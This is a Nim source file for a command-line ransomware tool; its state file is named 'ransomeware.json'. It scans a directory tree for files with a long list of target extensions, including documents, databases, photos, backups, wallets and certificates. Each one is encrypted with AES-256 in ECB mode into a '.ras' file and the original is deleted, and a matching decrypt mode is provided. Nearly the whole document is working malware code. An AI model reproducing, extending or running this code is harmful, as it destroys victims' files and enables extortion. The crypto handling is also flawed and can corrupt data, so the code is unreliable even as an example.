import nimcrypto / [rijndael, bcmode], spinny
import std / [logging, os]
from std / json import `$`, parseJson
from std / jsonutils import toJson, jsonTo
from std / strformat import fmt
from std / strutils import split, strip, parseEnum

type

    EncryptedFile = ref object

        path : string
        encrypted : bool

    FileData = ref object

        completed: bool
        filepaths: seq[EncryptedFile]

const
    FILENAME = "ransomeware.json"
    FILETYPE = [
        ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv",
        ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf",
        ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf",
        ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg",
        ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo",
        ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
        ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip",
        ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x",
        ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc",
        ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba",
        ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset",
        ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".odp",
        ".bik", ".epk", ".rgss3a", ".pak", ".big", ".wallet", ".wotreplay",
        ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".png",
        ".jpeg", ".txt", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer",
        ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", ".raw",
        ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr",
        ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe",
        ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", ".pdd", ".psd", ".dbf",
        ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb",
        ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx",
        ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm",
        ".odp", ".ods", ".odt", ".xls", ".xml", ".bmp", ".css", ".html", ".json",
        ".xlam", ".xla", ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt",
    ]

let
    configFile = getConfigDir() / FILENAME
    logger = newConsoleLogger(fmtStr = "$levelname -> ")

addHandler(logger)
proc posOfLastData(data : openArray[byte]) : int =

    result = data.len()
    for pos in countdown(result - 1, 0):

        if data[pos] != 0:

            return pos

proc encryptFile(path, privatekey : string) =
    ## Encrypts the contents of a file and returns the file's size

    var encryption : ECB[aes256]
    let
        encryptedFile = open(path & ".ras", fmWrite)
        data = readFile(path)
        blockLength : int = block :

            var length : int = aes256.sizeBlock
            let dataLength : int = data.len()

            if dataLength > length:

                if dataLength mod aes256.sizeBlock != 0:

                    length = aes256.sizeBlock * ((data.len div aes256.sizeBlock) + 1)

                else:

                    length = aes256.sizeBlock * (data.len div aes256.sizeBlock)

            length

    var
        bytekey : seq[byte] = newSeq[byte](aes256.sizeKey)
        bytedata : seq[byte] = newSeq[byte](blockLength)
        encryptedata : seq[byte] = newSeq[byte](blockLength)

    copyMem(addr bytekey[0], privatekey[0].unsafeAddr(), privatekey.len())
    copyMem(addr bytedata[0], data[0].unsafeAddr(), data.len())

    encryption.init(bytekey)
    encryption.encrypt(bytedata, encryptedata)
    encryption.clear()

    discard encryptedFile.writeBytes(encryptedata, 0, encryptedata.posOfLastData())
    encryptedFile.close()

    removeFile(path)

proc decryptFile(path, privatekey : string) =
    ## Decrypts the content of a file, returns true if successful and false if not

    var decryption : ECB[aes256]
    let
        pathcontent = path.splitFile
        decryptedFile = open(pathcontent.dir / pathcontent.name, fmWrite)
        data = readFile(path)
        blockLength : int = block :

            var length : int = aes256.sizeBlock
            let dataLength : int = data.len()

            if dataLength > length:

                if dataLength mod aes256.sizeBlock != 0:

                    length = aes256.sizeBlock * ((data.len div aes256.sizeBlock) + 1)

                else:

                    length = aes256.sizeBlock * (data.len div aes256.sizeBlock)

            length

    var
        bytekey : seq[byte] = newSeq[byte](aes256.sizeKey)
        bytedata : seq[byte] = newSeq[byte](blockLength)
        decryptedata : seq[byte] = newSeq[byte](blockLength)

    copyMem(addr bytekey[0], privatekey[0].unsafeAddr(), privatekey.len())
    copyMem(addr bytedata[0], data[0].unsafeAddr(), data.len())

    decryption.init(bytekey)
    decryption.decrypt(bytedata, decryptedata)
    decryption.clear()

    discard decryptedFile.writeBytes(decryptedata, 0, decryptedata.posOfLastData())
    decryptedFile.close()

    removeFile(path)

proc findAllFiles(path : string) : bool =

    result = true
    if not dirExists(path):

        return false

    var data : FileData = new FileData
    let spinner = newSpinny(fmt"Scanning dir {path} and it's sub directories for files", skClock)
    spinner.start()

    for file in walkDirRec(path):

        if file.splitFile().ext in FILETYPE:

            data.filepaths.add(EncryptedFile(path : file))

    data.completed = true
    spinner.success("Finished scanning")

    ## Write information of all files to FILENAME
    writeFile(configFile, $toJson(data))
    notice(fmt"saved all discovered files to {configFile}")

proc encryptFiles(key : string) =

    ## Loads data of all discovered files from FILENAME
    let
        file = open(configFile, fmRead)
        content = file.readAll()
        settings = parseJson(content)
        spinner = newSpinny(fmt"Encrypting all discovered files", makeSpinner(skClock.interval, skClock.frames))

    file.flushFile()
    file.close()

    spinner.start()
    var data = settings.jsonTo(FileData)
    for pos in 0..<data.filepaths.len:

        try:

            ## Check if file exists, if it does encrypt it.
            if fileExists(data.filepaths[pos].path):

                encryptFile(data.filepaths[pos].path, key)
                data.filepaths[pos].encrypted = true

        except:

            continue

    spinner.success("Finished encryption")

    ## Write information of all files to FILENAME
    writeFile(configFile, $toJson(data))
    notice(fmt"encrypted all files in {configFile}")

proc decryptFiles(key : string) =

    let
        content = readFile(configFile)
        settings = parseJson(content)
        spinner = newSpinny("Decrypting all discovered files", makeSpinner(skClock.interval, skClock.frames))

    spinner.start()
    var data = settings.jsonTo(FileData)
    for pos in 0..<data.filepaths.len():

        let encryptedFile = data.filepaths[pos].path & ".ras"
        if data.filepaths[pos].encrypted and fileExists(encryptedFile):

            try:

                if fileExists(encryptedFile):

                    decryptFile(encryptedFile, key)
                    data.filepaths[pos].encrypted = false

            except:

                continue

    spinner.success("Finished decryption")

    ## Write information of all files to FILENAME
    writeFile(configFile, $toJson(data))
    notice(fmt"decrypted all files in {configFile}")

when isMainModule:

    import std / [parseopt]
    from std / sequtils import foldl

    type

        Action {.pure.} = enum

            None
            Encrypt = "encrypt"
            Decrypt = "decrypt"

    ## Get and parse cmd parameters
    let
        cmdparams = commandLineParams()
        appname = getAppFilename().split("/")[^1]
        help = fmt"""
            {appname}

            Usage:

                {appname} [options]

            Options:

                --dir      | -d:[ path to dir ]               Dir to be scanned and encrypted / decrypted. If path is not given or directory not found. Scans root dir
                --key      | -k:[ encryption key ]            Encryption key
                --help     | -h                               Print's this help message

            Argument:

                encrypt                                       Encrypts all discovered files. If {configFile} is not found throws an exception. Requires option key and iv
                decrypt                                       Decrypts all discovered files. If {configFile} is not found throws an exception. Requires option key and iv
            """

    if cmdparams.len != 0:

        var
            runInfo : tuple[dir, key : string, action : Action] = ("", "", None)
            params = initOptParser(cmdparams.foldl("{a} {b}".fmt))

        while true:

            params.next()
            case params.kind

            of cmdEnd: break
            of cmdShortOption, cmdLongOption:

                if params.key == "dir" or params.key == "d":

                    runInfo.dir = params.val

                elif params.key == "key" or params.key == "k":

                    runInfo.key = params.val

                elif params.key == "help" or params.key == "h":

                    for line in help.split("\n"):

                        stdout.writeLine line.strip

                else:

                    fatal fmt"invalid option {params.key}"

            of cmdArgument:

                try:

                    runInfo.action = parseEnum[Action](params.key)

                except ValueError:

                    fatal fmt"argument {params.key} is invalid"
                    quit QuitFailure

        if runInfo.key.len() > 0:

            if fileExists(configFile):

                case runInfo.action

                of Encrypt:

                    if not findAllFiles(runInfo.dir):

                        fatal fmt"dir {runInfo.dir} not found"
                        quit QuitFailure

                    encryptFiles(runInfo.key)

                of Decrypt:

                    if not fileExists(configFile):

                        fatal fmt"cannot find config file at {configFile}"
                        quit QuitFailure

                    decryptFiles(runInfo.key)

                else:

                    fatal "no argument is supply"
                    quit QuitFailure

            else:

                fatal fmt"could not find file {configFile}"
                quit QuitFailure
